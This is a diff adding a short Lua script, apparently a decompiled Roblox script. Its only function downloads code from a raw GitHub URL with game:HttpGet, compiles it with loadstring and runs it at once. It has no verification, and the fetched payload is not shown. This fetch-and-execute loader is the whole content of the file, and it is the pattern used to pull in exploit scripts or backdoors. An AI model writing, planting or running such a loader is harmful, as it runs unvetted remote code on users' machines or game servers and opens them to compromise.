@@ -1,0 +1,20 @@
+-- Decompiled script:
+
+local downloadAndExecute = function()
+  local success, content = pcall(function()
+    return game:HttpGet('https://raw.githubusercontent.com/Jayfrr/brokenone/refs/heads/main/brokenbro', true)
+  end)
+  
+  if success then
+    local fn = loadstring(content)
+    if fn then
+      fn()
+    else
+      warn("Failed to compile downloaded content")
+    end
+  else
+    warn("Failed to download script:", content)
+  end
+end
+
+downloadAndExecute()
